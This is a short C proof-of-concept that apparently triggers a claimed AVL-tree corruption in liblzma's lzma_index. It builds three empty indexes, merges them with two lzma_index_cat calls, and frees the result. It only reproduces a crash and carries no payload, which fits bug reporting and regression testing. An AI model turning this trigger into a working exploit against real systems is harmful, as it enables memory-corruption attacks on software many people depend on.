/*
 * PoC for a liblzma lzma_index Stream-tree corruption.
 *
 * Builds three minimal, independent lzma_index objects via the public
 * API and merges them together with two lzma_index_cat() calls, which
 * is the library's documented way to concatenate separately-decoded
 * .xz Indexes (e.g. what lzma_file_info_decoder() does internally).
 * Freeing the resulting index triggers the AVL-tree rebalancing bug.
 */

#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
	lzma_index *a = lzma_index_init(NULL);
	lzma_index *b = lzma_index_init(NULL);
	lzma_index *c = lzma_index_init(NULL);

	if (a == NULL || b == NULL || c == NULL) {
		fprintf(stderr, "lzma_index_init failed\n");
		return 1;
	}

	if (lzma_index_cat(a, b, NULL) != LZMA_OK) {
		fprintf(stderr, "first lzma_index_cat failed\n");
		return 1;
	}

	if (lzma_index_cat(a, c, NULL) != LZMA_OK) {
		fprintf(stderr, "second lzma_index_cat failed\n");
		return 1;
	}

	lzma_index_end(a, NULL);

	printf("done\n");
	return 0;
}
